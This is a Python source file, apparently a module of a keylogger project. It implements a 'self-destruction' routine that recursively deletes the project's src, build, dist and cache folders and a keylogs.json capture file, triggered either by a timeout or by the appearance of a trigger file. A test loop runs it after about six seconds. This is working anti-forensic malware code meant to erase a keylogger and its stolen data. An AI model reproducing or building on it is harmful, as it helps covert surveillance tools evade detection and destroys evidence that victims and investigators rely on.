import os
import time
from datetime import datetime, timedelta
import shutil

class SelfDestruction:
    def __init__(self, start_time, timeout_minutes=5):
        self.start_time = start_time
        self.timeout = timedelta(minutes=timeout_minutes)

    def check_time_based_destruction(self):
        if datetime.now() - self.start_time > self.timeout:
            print("[!] Time exceeded. Initiating self-destruction...")
            self.destroy()

    def check_file_trigger(self, trigger_path="trigger.destroy"):
        if os.path.exists(trigger_path):
            print("[!] Trigger file detected. Initiating self-destruction...")
            self.destroy()

    def destroy(self):
        try:
            root_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../"))
            for folder in ["src", "__pycache__", "build", "dist"]:
                path = os.path.join(root_dir, folder)
                if os.path.exists(path):
                    shutil.rmtree(path, ignore_errors=True)

            keylog_file = os.path.join(root_dir, "keylogs.json")
            if os.path.exists(keylog_file):
                os.remove(keylog_file)

            print("[✔] Self-destruction complete.")
            exit(0)
        except Exception as e:
            print(f"[✘] Self-destruction failed: {e}")

# For testing
if __name__ == "__main__":
    sd = SelfDestruction(datetime.now(), timeout_minutes=0.1)  # ~6 seconds
    while True:
        sd.check_time_based_destruction()
        sd.check_file_trigger()
        time.sleep(2)
